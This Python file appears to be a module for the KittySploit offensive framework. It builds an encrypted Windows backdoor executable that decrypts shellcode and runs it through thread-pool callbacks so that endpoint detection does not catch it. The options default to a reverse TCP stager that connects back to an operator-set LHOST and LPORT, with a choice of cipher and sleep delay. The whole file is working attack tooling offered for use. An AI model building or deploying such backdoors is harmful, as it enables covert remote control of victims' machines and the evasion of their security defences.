#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.compile.backdoor_helpers import build_encrypted_zig_backdoor, option_value
from lib.compile.threadpool_injection import ThreadpoolInjectionBuilder


class Module(Backdoor):
    __info__ = {
        "name": "Thread Pool Injection Evasion",
        "description": (
            "Decrypt shellcode and queue it as a TpAllocWait/TpSetWait thread-pool callback "
            "(no CreateThread on the payload path)."
        ),
        "author": "KittySploit",
        "platform": Platform.WINDOWS,
        "arch": Arch.X64,
        "references": [
            "https://github.com/JoasASantos/Awesome-EDR-Evasion/blob/main/Codes/14_threadpool_injection.c",
        ],
    }

    payload_path = OptString("payloads/stagers/windows/x86/reverse_tcp", "Payload path", True)
    lhost = OptString("127.0.0.1", "LHOST", True)
    lport = OptPort(4444, "LPORT", True)
    encoder = OptString("", "Encoder (optional)", False)
    cipher = OptChoice("chacha", "Cipher", True, ["chacha", "rc4"])
    sleep = OptInteger(8000, "Sleep ms", False)
    output_name = OptString("threadpool_inject.exe", "Output filename", False)
    optimization = OptChoice("ReleaseSmall", "Optimization", False, ["Debug", "ReleaseFast", "ReleaseSafe", "ReleaseSmall"])
    save_source = OptBool(False, "Save C source", False, advanced=True)
    windows_subsystem = OptChoice("windows", "Subsystem", False, ["windows", "console"])

    def run(self):
        builder = ThreadpoolInjectionBuilder(
            cipher=str(option_value(self, "cipher") or "chacha").lower(),
            sleep_ms=int(option_value(self, "sleep") or 0),
        )
        return build_encrypted_zig_backdoor(
            self,
            builder,
            output_name="threadpool_inject.exe",
            save_source_name="threadpool_inject.zig",
        )
